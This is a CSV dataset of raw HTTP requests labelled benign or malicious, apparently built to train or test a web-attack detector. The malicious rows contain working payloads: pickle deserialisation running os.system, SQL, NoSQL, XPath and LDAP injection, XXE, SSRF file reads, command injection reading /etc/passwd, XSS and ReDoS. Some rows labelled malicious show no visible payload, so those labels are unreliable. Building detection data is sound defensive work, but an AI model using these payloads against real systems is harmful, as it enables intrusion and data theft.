label,text
benign,"GET /api/v2/search-products?query=smartwatch&price_min=100&price_max=400&in_stock=true HTTP/1.1
Host: online-retail-store.biz
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Cache-Control: no-cache"
benign,"GET /api/fetchMetadata?url=https%3A%2F%2Fnews-portal-network.ai%2Fstories%2F2024%2F05%2Ftechnology HTTP/1.1
Host: metadata-fetcher.news-portal-network.ai
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9"
benign,"POST /api/tasks HTTP/1.1
Host: teamflow-app.net
Authorization: Bearer 77YusL4ZLOpjk23XIqJ9idbQacM72
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0
Content-Length: 122
Connection: keep-alive

{""title"":""Prepare Q3 report"",""dueDate"":""2024-07-15T17:00:00Z"",""priority"":""high"",""assignedTo"":""claire.darwin"",""tags"":[""finance"",""reports""]}"
benign,"GET /search?q=latest+smartphone+reviews HTTP/1.1
Host: gadgetinsights.io
User-Agent: curl/7.88.0
Accept: text/html
Referer: https://gadgetinsights.io/
Connection: close"
benign,"GET /user/profile/data?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: secure-user-portal.net
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Cookie: sessionId=f8e3b2c9a7f158a1d03b"
benign,"POST /inventory/manage/add-item HTTP/1.1
Host: hub-fitness-supplies.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Content-Type: application/json
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Content-Length: 56
Connection: close

{""product_code"":""run-fast-5000"",""quantity"":3}"
benign,"GET /status/ping HTTP/1.1
Host: analytics-proxy.service-mesh.io
User-Agent: curl/7.64.1
Accept: */*
Connection: close"
benign,"GET /api/v5/search?q=TG9jYWxBdHRyaWJ1dGVz&continuation=RW5kcG9pbnQ5MDcyNQ==&params=eyJyZWdpb24iOiJldSIsImNhdGVnb3J5IjoiYXBwcyJ9 HTTP/1.1
Host: user-data-exchange.org
Accept: application/json
User-Agent: curl/7.88.1
Via: 1.1 proxy23.example.net
Connection: close"
malicious,"POST /auth/token/refresh HTTP/1.1
Host: secure-auth-service.auth-gateway.org
User-Agent: Python-requests/2.25.1
Accept: application/json, text/javascript
X-Payload-Pickle: \x80\x04\x95\x2b\x00\x00\x00\x00\x00\x00\x00cos\nbuiltins\neval\n\x94\x8c\x28__import__('os').system('id')\x94\x93\x94.\r
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

token=MTIzNDU2Nzg5&refresh=true"
benign,"POST /api/v1/feedback/send HTTP/1.1
Host: fresh-food-marketplace.org
Content-Type: application/json
Content-Language: en-US
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Connection: keep-alive
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Mobile Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123.12xyw7J08vVR30N8FxJ
X-CSRF-Token: Njg1N2YzNDUtZTY0Ny00Mzk5LTgxMWYtNmYwZTlkYTFiNmMz

{""customerId"":""3098832"",""rating"":5,""comments"":""Great selection of organic produce and fast delivery service!"",""date"":""2024-06-04T08:12:00Z""}"
benign,"DELETE /v4/documents/8320 HTTP/1.1
Host: data-analytics-layer.io
Authorization: Bearer 2vE9cAdkLM3x9Yz
If-Match: ""7aa32d0f""
User-Agent: Python-requests/2.31.0
Accept: application/json
Connection: keep-alive"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-User-Input: <iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGZpemplZCcgKS48L3NjcmlwdD4=""></iframe>
Origin: https://dashboard.api.cloud-data-services.ai
Content-Length: 27
Cookie: authid=YTJmNjU1Y2E4NDAwZGNiYTc3MWZmYmU4OQ==
Pragma: no-cache
Cache-Control: no-cache

{""query"":""status:active""}"
malicious,"GET /catalog/items?view=grid&view=list&id=123&filter_evil_chars=true&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: media-content-center.tv
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Cache-Control: max-age=0
Referer: https://media-content-center.tv/home
Connection: keep-alive"
malicious,"GET /user/profile/view?id=2879 HTTP/1.1
Host: urban-fashion-outlet.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Cookie: lang=en-US; tracking_id=QxZb' OR IF(ASCII(SUBSTRING((SELECT password /*!FROM*/ users /*!WHERE*/ username='admin'),1,1))=0x61, SLEEP(5),0) -- ; promo_seen=yes
Referer: https://urban-fashion-outlet.biz/app/home"
benign,"OPTIONS /services/item/details HTTP/1.1
Host: cloud-microservice-hub.io
Origin: https://app.user-dashboard.biz
Access-Control-Request-Method: GET
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Accept: application/json, text/plain, */*
Access-Control-Request-Headers: Content-Type
Accept-Language: en-US,en;q=0.9
Connection: close"
malicious,"GET /api/v1/products/search?q=laptop HTTP/1.1
Host: assets-content-uploads.internal
User-Agent: curl/7.77.0
Accept: */*
Cache-Control: no-cache"
benign,"PUT /v2/inventory/products/7329 HTTP/1.1
Host: wholesale-stock-manager.biz
If-Match: ""926cc8b3-d30f-4a0e-9adf-7de218f8301b""
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Authorization: Basic bG9naW46cGFzc3dvcmQ=
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Content-Length: 156
Connection: close

{""name"":""Ultra HD Monitor 27inch"",""stockLevel"":58,""price"":329.99,""metadata"":{""category"":""electronics"",""tags"":[""monitor"",""display"",""4K""]}}"
benign,"GET /api/v1/products?category=outdoor&sort=popularity HTTP/1.1
Host: freshgear-outdoors.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: application/json, text/plain, */*
Accept-Encoding: br, gzip, deflate
Accept-Language: en-GB,en;q=0.8
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
Connection: close"
benign,"HEAD /index.html HTTP/1.1
Host: portal.secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Cache-Control: max-age=0"
malicious,"HEAD /api/v3/items/search HTTP/1.1
Host: cache-injected-content.cloud-data-services.ai
User-Agent: Python-urllib/3.9
Accept: application/json
Cache-Control: max-age=0
Connection: close"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: online-retail-store.biz
Accept: application/json
Content-Type: application/json-patch+json
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
X-Forwarded-For: 192.168.1.204
Authorization: Bearer ZC91pIh5qJw2UPcAzBkYm6nQRcLxz39dfNQy
Content-Length: 52

[{""op"":""replace"",""path"":""/shipping/autoSelect"",""value"":false}]"
benign,"GET /app/user/settings HTTP/1.1
Host: secure-user-portal.net
Accept: application/json
Connection: keep-alive
Cookie: sid=v0ZpmrnVfNSRjoO53g6LkgxACsmEq4o9; access_token=abcabcabc123123123xyzxyzxyz999999; preferences=darkmode=true; expires=2024-12-31
User-Agent: curl/7.81.0
Accept-Language: en-US,en;q=0.9"
benign,"PUT /api/library/book/4321 HTTP/1.1
Host: digital-library.eastcoast-readers.info
Authorization: Bearer A3J29djslmf93k21jd9f1
Content-Type: application/xml
Accept: application/xml
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Content-Length: 162
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<book>
  <bookId>4321</bookId>
  <title>The Ocean's Whisper</title>
  <author>Elena White</author>
  <status>Checked In</status>
  <shelfLocation>B-12</shelfLocation>
</book>"
benign,"GET /user/profile/settings?cmd=view_details&user_id=35572 HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Referer: https://secure-user-portal.net/dashboard
DNT: 1"
benign,"POST /api/v1/reviews HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: python-requests/2.28.1
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Authorization: Bearer mF_9.B5f-4.1JqM
Content-Length: 95
Connection: keep-alive
X-Forwarded-For: 192.168.1.15

product_id=3421&user_id=9827&rating=5&comments=VGhpcyBwcm9kdWN0IGV4Y2VlZHMgdGhlIGNoYXJ0LCB2ZXJ5IGhlbHBmdWwsIHlvdXIgbW9uZXkgc3RhcnMu"
benign,"HEAD /downloads/games/space_adventure_setup_64bit.exe HTTP/1.1
Host: nextgen-gaming.zone
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: */*
Pragma: no-cache
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /blog/posts/2024/06/15/advancements-in-ai HTTP/1.1
Host: insight-tech-blog.org
Accept-Encoding: gzip, deflate
Cookie: blog_sid=db98394a2df79619; visitor_token=7c467ab39124; analytics_sid=6582b7df
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
malicious,"GET /proxy/file%3A%2F%2F%2Fhome/user/.bash_history HTTP/1.1
Host: education-platform-ai.net
User-Agent: Python-urllib/3.9
Accept: */*
Referer: https://education-platform-ai.net/course/intro
Connection: close"
benign,"GET /find?search_term=how+to+bake+bread+with+whole+grain HTTP/1.1
Host: urban-cookery-tips.org
Accept: text/html
Referer: https://urban-cookery-tips.org/home
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Cache-Control: no-cache"
benign,"PUT /api/v1/devices/7fa21cd HTTP/1.1
Host: iot-control.sys-management-cloud.dev
Authorization: Bearer MWYyZDFlMmU2N2RmZTY0ZQ==
Accept: application/xml
Content-Type: application/xml
X-Forwarded-For: 203.0.113.76
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Content-Length: 157

<device>
  <deviceId>7fa21cd</deviceId>
  <status>active</status>
  <settings>
    <brightness>85</brightness>
    <volume>60</volume>
    <mode>energy_saving</mode>
  </settings>
</device>"
benign,"GET /img/loading_animated.gif HTTP/1.1
Host: green-garden-marketplace.biz
Accept: image/gif,image/*,*/*;q=0.5
Referer: https://green-garden-marketplace.biz/cart
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Via: 1.1 vegur
Connection: close"
malicious,"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Content-Length: 94
Origin: https://community.game-dev-forum.org
Cookie: session=wbFs83jqMl20HdF9

theme=dark';%20db.users.update({username:%27admin%27},%20{$set:{isAdmin:true}});%20//&notifications=true"
benign,"GET /images/logo.svg HTTP/1.1
Host: smart-home-controllers.io
User-Agent: curl/7.85.0
Accept: image/svg+xml
X-Forwarded-For: 192.168.0.55
Connection: close"
malicious,"GET /admin/run_backup_script.sh?host=10.0.0.15%3B%20cat%20%2Fetc%2Fpasswd HTTP/1.1
Host: secure-file-storage.io
User-Agent: curl/7.77.0
Accept: */*
Connection: close"
benign,"GET /content/article/read?id=44d5f747-7cd9-4dc1-ab8b-0987e4519d23 HTTP/1.1
Host: newsfeed-lifeinfo.ai
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Connection: close"
malicious,"POST /api/v2/register HTTP/1.1
Host: api-newsevent-hub.net
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Accept-Language: en-GB,en;q=0.9
Cache-Control: no-cache
Referer: https://api-newsevent-hub.net/signup

username=jessica&rdata_b64=cHJvZHVjdF9pZD0zMDA7IFVOVEFURSAgU0VMRUNUIDEyMyBEUk9QIFRBQkxFIGVzIHRlc3RzOyAtLQ=="
benign,"POST /api/order/submit HTTP/1.1
Host: orders.fast-move-express.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: application/xml, text/html
Content-Length: 162
Connection: keep-alive
Cache-Control: no-cache

<order>
  <customerId>73921</customerId>
  <items>
    <item>
      <productId>4862</productId>
      <quantity>2</quantity>
    </item>
  </items>
  <priority>normal</priority>
</order>"
malicious,"POST /portal/search/items HTTP/1.1
Host: news-aggregator-service.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/xml,application/xhtml+xml,text/html;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/xml
Content-Length: 127
Cache-Control: max-age=0

<searchRequest>
  <term>' or count(//node()) > 0 or ''='</term>
  <category>news</category>
</searchRequest>"
benign,"DELETE /api/assets/website_media/hd_video_23 HTTP/1.1
Host: media-hosting-platform.streaming-content.biz
Authorization: Bearer c9afdf8e6ea7398e4d723cd224efa7867a41cc2f
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
X-Forwarded-For: 157.55.39.1"
malicious,"POST /api/v1/feedback HTTP/1.1
Host: feedback.portal-analytics.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: text/plain
X-Debug-Mode: enabled
Content-Length: 51

I really like the new features! Keep up the great work."
benign,"PUT /v3/user/preferences HTTP/1.1
Host: data-insights-engineering.com
Authorization: Bearer ZG93bl90b2tlbl9wcmVtaXVt
Content-Type: application/json
Accept: application/json
DNT: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 84

{""isAdmin"":false,""dashboardView"":""compact"",""emailUpdates"":false,""timezone"":""America/New_York""}"
benign,"POST /polls/211/vote HTTP/1.1
Host: tech-startup-connect.io
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Accept: application/json
User-Agent: curl/7.88.1
Accept-Encoding: gzip, deflate

poll_id=211&vote_option=B"
benign,"POST /accounts/login HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Connection: keep-alive
Content-Length: 99
User-Agent: python-requests/2.28.1
X-Requested-With: XMLHttpRequest
Cache-Control: no-cache
Content-Language: en

username=analyst_jane&password=securepass123&csrf_token=3bc6e0f83a5d4332ab2ec8a9ef1d3faf&form_id=login_form&timestamp=1685704356&return_url=%2Fdashboard"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
User-Agent: curl/7.77.0

query=latest&filter_b64=cHJvZHVjdF9pZD0xMjM7IFVQREFURSB1c2VycyBTRVQgYWRtaW49MSBXSEVSRSBpZD0xOyAtLQ=="
benign,"POST /session/end HTTP/1.1
Host: edu-course-platform.edu
Connection: close
Content-Type: application/x-www-form-urlencoded
Referer: https://edu-course-platform.edu/user/dashboard
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/114.0.1823.41
Cookie: sess=afd9b771331e9c39e6c4bcf7
Accept-Encoding: gzip, deflate
Content-Length: 35

csrf_token=3d2a69b1f4e8f9ca7d571278"
malicious,"POST /app/user/settings/search HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/json
Content-Length: 90
Connection: keep-alive

{""searchFilter"":""(cn=test_user)(objectClass=user))(|(uid=administrator)""}"
benign,"GET /api/v3/events/search?keyword=%4a%5b%6C%7d&location=NewYork HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
User-Agent: Bingbot/2.0
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Via: 1.1 api-gateway.cloud
Connection: close"
malicious,"POST /upload/processDocument HTTP/1.1
Host: online-retail-store.biz
User-Agent: curl/7.77.0
Accept: */*
Content-Type: multipart/form-data; boundary=----UploadBoundaryX1Y2Z3
Content-Length: 382
Connection: Keep-Alive

------UploadBoundaryX1Y2Z3
Content-Disposition: form-data; name=""metadata""

Retail config XML upload
------UploadBoundaryX1Y2Z3
Content-Disposition: form-data; name=""configFile""; filename=""config.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------UploadBoundaryX1Y2Z3--"
benign,"GET /profile/settings HTTP/1.1
Host: secure-membership-app.co
X-Forwarded-For: 172.31.0.45
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Accept: application/json, text/plain, */*
DNT: 1
Referer: https://secure-membership-app.co/dashboard
Connection: keep-alive"
malicious,"POST /data/validate/pattern HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 184
Referer: https://console.cloud-data-services.ai/dashboard
Sec-CH-UA: ""Chromium"";v=""94"", ""Google Chrome"";v=""94"", "" Not A;Brand"";v=""99""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android""
Cache-Control: no-cache

{""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""}"
malicious,"POST /feedback/submit HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Content-Length: 160
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Cache-Control: no-cache

{""visitor_name"":""Evelyn"",""email"":""evelyn77@my-personal-blog-site.info"",""message"":""Enjoy your posts! FYI javascript:alert('XSS')""}"
